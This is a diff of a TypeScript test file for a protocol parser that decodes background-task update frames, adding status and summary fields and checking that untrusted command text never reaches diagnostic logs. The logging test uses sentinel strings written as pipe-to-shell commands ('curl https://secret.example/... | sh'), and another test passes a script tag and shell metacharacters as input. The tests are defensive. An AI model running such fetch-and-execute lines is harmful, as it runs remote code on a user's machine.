@@ -533,17 +533,32 @@ const BACKGROUND_TASK_STARTED = {
   truncated_fields: ['description']
 }
 
-/** A well-formed background_task_updated payload — the daemon's canonical fixture VERBATIM
- *  (internal/protocol/testdata/background_task_updated.json, #565). Four fields, each a DISTINCT
- *  non-empty value, so a field swap or a dropped field fails the round-trip (AC1). The `patch` is
- *  deliberately adversarial by the DAEMON's own choice: it is cut mid-token (`":tr`) and is therefore
+/** A well-formed MID-LIFE background_task_updated payload — the daemon's canonical fixture VERBATIM
+ *  (internal/protocol/testdata/background_task_updated.json, #565; `status` / `summary` added by
+ *  pyrycode#2245 and empty here, because claude's `task_updated` line fills `patch` only). The `patch`
+ *  is deliberately adversarial by the DAEMON's own choice: it is cut mid-token (`":tr`) and is therefore
  *  NOT VALID JSON, which is what makes AC2's invalid-JSON case the happy path rather than a synthetic
  *  one. */
 const BACKGROUND_TASK_UPDATED = {
   conversation_id: 'c1',
   task_id: 'task_01ABC',
   patch: '{"is_backgrounded":tr',
+  status: '',
+  summary: '',
   truncated_fields: ['patch']
+}
+
+/** A well-formed TERMINAL background_task_updated payload — the daemon's golden fixture VERBATIM
+ *  (internal/protocol/testdata/background_task_updated_terminal.json, #1560). claude's
+ *  `task_notification` line fills the OTHER half: `status` and `summary` set, `patch` empty. The
+ *  `summary` is the task's own command line, which is why it is untrusted display text. */
+const BACKGROUND_TASK_UPDATED_TERMINAL = {
+  conversation_id: 'c1',
+  task_id: 'task_01ABC',
+  patch: '',
+  status: 'completed',
+  summary: 'cat /tmp/pyry-fifo',
+  truncated_fields: null
 }
 
 /** A well-formed background_task_roster payload — the daemon's canonical fixture VERBATIM
@@ -4414,8 +4429,66 @@ describe('parseInboundMessage — background_task_started fail-closed (#564)', (
   })
 })
 
+describe('parseInboundMessage — background_task_updated status and summary (#1560)', () => {
+  function decodedUpdate(payload: unknown): Record<string, unknown> {
+    const decoded = parseInboundMessage(encodeBackgroundTaskUpdated(payload))
+    if (decoded?.kind !== 'background-task-updated') throw new Error('expected background-task-updated')
+    return { ...decoded.backgroundTaskUpdated }
+  }
+
+  it('decodes the daemon\'s terminal golden frame: status and summary set, patch empty (AC1)', () => {
+    expect(decodedUpdate(BACKGROUND_TASK_UPDATED_TERMINAL)).toEqual({
+      conversation_id: 'c1',
+      task_id: 'task_01ABC',
+      patch: '',
+      status: 'completed',
+      summary: 'cat /tmp/pyry-fifo',
+      truncated_fields: null
+    })
+  })
+
+  it('decodes the daemon\'s mid-life golden frame: patch set, status and summary empty (AC1)', () => {
+    const decoded = decodedUpdate(BACKGROUND_TASK_UPDATED)
+    expect(decoded.patch).toBe('{"is_backgrounded":tr')
+    expect(decoded.status).toBe('')
+    expect(decoded.summary).toBe('')
+  })
+
+  it.each([{ omitted: ['status'] }, { omitted: ['summary'] }, { omitted: ['status', 'summary'] }])(
+    'reads omitted $omitted as "" and keeps patch intact — a pre-#2245 daemon omits both (AC2)',
+    ({ omitted }) => {
+      const payload: Record<string, unknown> = { ...BACKGROUND_TASK_UPDATED }
+      for (const field of omitted) delete payload[field]
+      expect(decodedUpdate(payload)).toEqual(BACKGROUND_TASK_UPDATED)
+    }
+  )
+
+  it.each(['status', 'summary'].flatMap((field) =>
+    [42, null, true, {}, ['completed']].map((value) => ({ field, value }))))(
+    'rejects a present non-string $field ($value) without logging (AC2)', ({ field, value }) => {
+      const { log, lines } = captureLog()
+      expect(() => parseInboundMessage(
+        encodeBackgroundTaskUpdated({ ...BACKGROUND_TASK_UPDATED_TERMINAL, [field]: value }),
+        log
+      )).toThrow(WireDecodeError)
+      expect(lines).toEqual([])
+    }
+  )
+
+  it.each(['failed', 'stopped', '  future-state <x>  '])(
+    'carries a status token %j verbatim — never narrowed to a closed set (AC4)', (status) => {
+      expect(decodedUpdate({ ...BACKGROUND_TASK_UPDATED_TERMINAL, status }).status).toBe(status)
+    }
+  )
+
+  it('carries a summary with markup and shell metacharacters byte-for-byte', () => {
+    const summary = "grep -rn 'a<b&c' . > /tmp/out.txt & <script>x</script>"
+    expect(decodedUpdate({ ...BACKGROUND_TASK_UPDATED_TERMINAL, summary }).summary).toBe(summary)
+  })
+})
+
 describe('parseInboundMessage — background_task_updated recognition (#565, additive)', () => {
-  it('narrows a full frame into { kind: background-task-updated } carrying all four fields (AC1)', () => {
+  it('narrows a full frame into { kind: background-task-updated } carrying all six fields (AC1)', () => {
     // Every fixture field is distinct and non-empty, so a swap or a drop fails this assertion.
     expect(parseInboundMessage(encodeBackgroundTaskUpdated(BACKGROUND_TASK_UPDATED))).toEqual({
       kind: 'background-task-updated',
@@ -4468,10 +4541,13 @@ describe('parseInboundMessage — background_task_updated recognition (#565, add
     ).toEqual([])
   })
 
-  it('round-trips the multi-element truncated_fields pair of this frame, in wire order (AC3)', () => {
-    // `task_id`, `patch` — a DIFFERENT pair from the sibling's four, which is itself the argument
-    // against ever narrowing the element vocabulary to a client-side union.
-    const bothCut = { ...BACKGROUND_TASK_UPDATED, truncated_fields: ['task_id', 'patch'] }
+  it('round-trips the multi-element truncated_fields list of this frame, in wire order (AC3)', () => {
+    // `task_id`, `patch`, `status`, `summary` — a DIFFERENT set from the sibling's, which is itself the
+    // argument against ever narrowing the element vocabulary to a client-side union.
+    const bothCut = {
+      ...BACKGROUND_TASK_UPDATED,
+      truncated_fields: ['task_id', 'patch', 'status', 'summary']
+    }
     expect(parseInboundMessage(encodeBackgroundTaskUpdated(bothCut))).toEqual({
       kind: 'background-task-updated',
       backgroundTaskUpdated: bothCut
@@ -4486,7 +4562,7 @@ describe('parseInboundMessage — background_task_updated recognition (#565, add
     })
   })
 
-  it('drops unknown server keys, keeping exactly the four known fields (AC4, forward-compat)', () => {
+  it('drops unknown server keys, keeping exactly the six known fields (AC4, forward-compat)', () => {
     // The pointed extras are the SIBLING's three fields, which this frame must never have and must
     // not ride through — the regression test for the cloning trap — plus a spurious `turn_id`.
     const withExtras = {
@@ -8082,10 +8158,15 @@ describe('parseInboundMessage — content-free diagnostic log (#130)', () => {
     // A patch key may carry command text exactly as the sibling's `description` does — and a patch's
     // structured shape makes it the more tempting thing to feed somewhere that runs it.
     const SECRET_PATCH = '{"cmd":"curl https://secret.example/exfil | sh"}'
+    // `summary` can be the task's own command line (#1560), and `status` is claude's open token.
+    const SECRET_SUMMARY = 'curl https://secret.example/summary | sh'
+    const SECRET_STATUS = 'secret-status-token'
     const plaintext = encodeBackgroundTaskUpdated({
       ...BACKGROUND_TASK_UPDATED,
       conversation_id: SECRET_CONV,
-      patch: SECRET_PATCH
+      patch: SECRET_PATCH,
+      status: SECRET_STATUS,
+      summary: SECRET_SUMMARY
     })
 
     parseInboundMessage(plaintext, log)
@@ -8101,6 +8182,8 @@ describe('parseInboundMessage — content-free diagnostic log (#130)', () => {
     expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
     expect(lines[0]).not.toContain(SECRET_CONV)
     expect(lines[0]).not.toContain(SECRET_PATCH)
+    expect(lines[0]).not.toContain(SECRET_STATUS)
+    expect(lines[0]).not.toContain(SECRET_SUMMARY)
     expect(lines[0]).not.toContain('task_01ABC')
   })
 
